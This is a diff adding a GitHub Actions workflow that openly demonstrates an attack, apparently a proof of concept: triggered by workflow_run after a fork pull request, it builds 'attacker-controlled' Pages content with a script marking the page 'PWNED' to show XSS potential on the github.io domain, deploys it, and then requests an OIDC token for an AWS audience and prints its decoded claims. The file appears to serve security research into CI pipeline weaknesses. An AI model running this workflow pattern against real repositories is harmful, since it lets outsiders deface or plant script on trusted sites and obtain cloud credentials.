@@ -1,0 +1,54 @@
+name: workflow_run Pages Deploy Attempt
+on:
+  workflow_run:
+    workflows: ["PR Trigger (fork context)"]
+    types: [completed]
+permissions:
+  pages: write
+  id-token: write
+  contents: read
+jobs:
+  deploy-pages:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deploy.outputs.page_url }}
+    steps:
+      - name: Show context
+        run: |
+          echo "actor: $GITHUB_ACTOR"
+          echo "ref: $GITHUB_REF"
+          echo "head_ref: $GITHUB_HEAD_REF"
+          echo "event: $GITHUB_EVENT_NAME"
+      - name: Create attacker-controlled pages content
+        run: |
+          mkdir -p _site
+          cat > _site/index.html << 'HTML'
+          <html><body>
+          <h1>ATTACKER CONTROLLED VIA WORKFLOW_RUN FORK PR</h1>
+          <script>
+            // Demonstrate XSS potential on github.io domain
+            document.title = "PWNED - " + document.domain;
+          </script>
+          </body></html>
+          HTML
+          echo "Content created"
+      - name: Upload pages artifact
+        uses: actions/upload-pages-artifact@v3
+        with:
+          path: _site
+        id: upload
+      - name: Deploy to Pages
+        uses: actions/deploy-pages@v4
+        id: deploy
+        continue-on-error: true
+      - name: Check OIDC token for pages env
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "$T" | cut -d. -f2 | python3 -c "
+          import sys, base64, json
+          d = sys.stdin.read().strip()
+          p = d + chr(61) * (4 - len(d) % 4)
+          j = json.loads(base64.urlsafe_b64decode(p))
+          print(json.dumps({k: j[k] for k in ['sub', 'environment', 'ref', 'actor', 'event_name', 'head_ref'] if k in j}, indent=2))"
